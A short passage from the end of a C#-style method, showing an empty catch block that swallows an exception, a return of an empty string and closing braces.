		catch (Exception)
		{
		}
		return "";
	}
}
